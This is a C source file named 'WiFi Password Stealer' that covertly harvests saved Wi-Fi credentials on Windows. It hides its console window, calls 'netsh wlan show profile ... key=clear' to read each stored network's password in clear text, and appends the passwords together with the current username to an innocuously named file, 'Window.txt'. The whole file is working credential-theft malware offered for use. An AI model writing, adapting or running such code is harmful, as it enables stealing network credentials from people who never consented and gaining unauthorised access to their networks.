/*
	Name       : WiFi Password Stealer
	Creator    : Shail
	Start Date : 11 March, 2021
	End Date   : 13 March, 2021
	Programming: C
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define e 10
#define r 100
#define MAX_LINE 46

FILE *cmd;

char profiles[10][20];
char passwds[10][20];

int get_profiles();
void get_passwds();
void write_data();
int split(char *output, char result[e][r]);
void beep();

void main() {
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	int num_profiles = get_profiles();
	if(num_profiles)
		get_passwds(num_profiles);
	write_data(num_profiles);
	beep();
}

void beep() {
	printf("\a");
	int i;
	for(i=0;i<1000*1000*100;i++) {}
}

int get_profiles() {
	char line[MAX_LINE];
	char *output = calloc(300, sizeof(char));

	cmd = popen("netsh wlan show profiles", "r");


	while(fgets(line, MAX_LINE, cmd)) {
		if(strlen(line) == 45) {
			pclose(cmd);
			return 0;
		}
		if(strstr(line, "All User Profile     :"))
			strcat(output, line);
	}
	pclose(cmd);

	char profs[10][100];

	// Spliting string using \n (New Line Charachter)
	int n = split(output, profs);

	// Separating PROFILE NAMES from Whole String
	char prof[100];
	char * pch, ch;
	int find, x, i;
	for(i=0;i<n;i++) {
		strcpy(prof, profs[i]);
		pch = strchr(prof,':');
		find = pch-prof+2;
		ch = prof[find];
		x = 0;
		while(ch != '\0') {
			profiles[i][x] = ch;
			find++;
			x++;
			ch = prof[find];
		}
	}
	
	return n; // Returning Number of profiles found
}


int split(char *output, char result[e][r])
{
	int i, x=0, n=0;
	char c;
	char key[100] = "";
	for(i=0;i<strlen(output);i++) {
		c = output[i];
		key[x] = c;
		if(c == '\n') {
			key[x] = '\0';
			strcpy(result[n], key);
			n++;
			x = -1;
		}
		x++;
	}
	return n;
}


void get_passwds(int num_profiles) {
	int i_prof, add;

	char line[MAX_LINE];
	char prof[20];
	char comd[60];
	// char *output = calloc(300, sizeof(char));
	char output[300];
	char keys[10][100];
	char key[100] = "";

	for(i_prof=0;i_prof<num_profiles;i_prof++)
	{
		strcpy(prof, profiles[i_prof]); // Saving one profile to prof variable
		sprintf(comd, "netsh wlan show profile \"%s\" key=clear", prof);
		cmd = popen(comd, "r");
		add = 0;
		while(fgets(line, MAX_LINE, cmd)) {
			if(strstr(line, "Key Content            :"))
			{
				strcat(output, line);
				add = 1;
			}
		}
		pclose(cmd);
		if(!add)
			strcat(output, ": [NONE]\n");
	}

	int n = split(output, keys);


	int inc;
	char * pch, ch;
  	int find, x;
  	for(inc=0;inc<n;inc++) {
  		strcpy(key, keys[inc]);
  		pch = strchr(key,':');
  		find = pch-key+2;
		ch = key[find];
		x = 0;
		while(ch != '\0') {
			passwds[inc][x] = ch;
			find++;
			x++;
			ch = key[find];
		}
	}
}


void write_data(int num_profiles) {
	FILE * fp;
	int i;
	char Uname[15];
	char dots[] = "---------------------------------------\n";

	fp = fopen("Window.txt", "a");  // Opening File to Append data in it
	fprintf(fp, "%sUSERNAME :: ", dots);

	// Saving USERNAME of Current User to Uname variable
	cmd = popen("echo %USERNAME%", "r");
	fgets(Uname, 15, cmd);
	pclose(cmd);
	fputs(Uname, fp); // Saving username in file

	if(!num_profiles)
		fputs("There is no wireless interface on the system\n", fp);
	else {
		for(i=0;i<num_profiles;i++) {
			fprintf(fp, "%-30s : %s\n", profiles[i], passwds[i]);
		}
	}

	fputs(dots, fp);
	fclose(fp);
}
